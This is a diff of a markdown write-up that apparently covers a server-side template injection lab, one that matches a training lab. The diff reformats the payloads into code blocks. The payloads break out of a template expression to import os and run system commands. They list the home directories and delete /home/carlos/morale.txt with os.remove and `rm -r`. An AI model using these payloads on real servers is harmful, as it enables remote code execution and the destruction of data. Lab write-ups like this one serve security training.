@@ -49,23 +49,27 @@
 * It will compile this code in order.
 * I will do in order as the server but i will inject my payload:
 
->{{user.nickname......................i_will_inject_here..........................}}
-                             }}{%import os%}{{os.system('ls /home/carlos')
-
+```
+{{user.nickname......................i_will_inject_here..........................}}
+```
 * Then the server will close with `}}` automatically.
 - So it is a payload: `}}{%import os%}{{os.system('ls /home/carlos')`
 * The final form with payload after injecting in the server side it will seem like that:
-
-> `{{user.name`  }}{%import+os%}{{os.system('ls') `}}` 
+```
+`{{user.name`  }}{%import+os%}{{os.system('ls') `}}` 
+```
 - list content of `/home` directory:
-
-> user.name}}{%import os%}{{os.system('ls+/home')
+```
+user.name}}{%import os%}{{os.system('ls+/home')
+```
 - I removed the file with `remove("file_path")` method.
-
->}}{%import os%}{{os.remove("/home/carlos/morale.txt") 
+```
+}}{%import os%}{{os.remove("/home/carlos/morale.txt") 
+```
 - Or you can use `system()` method to execute any command on the server.
-
->}}{%import os%}{{os.system("rm -r /home/carlos/morale.txt")
+```
+}}{%import os%}{{os.system("rm -r /home/carlos/morale.txt")
+```
 
 -----------------------------------------------------------------------
 
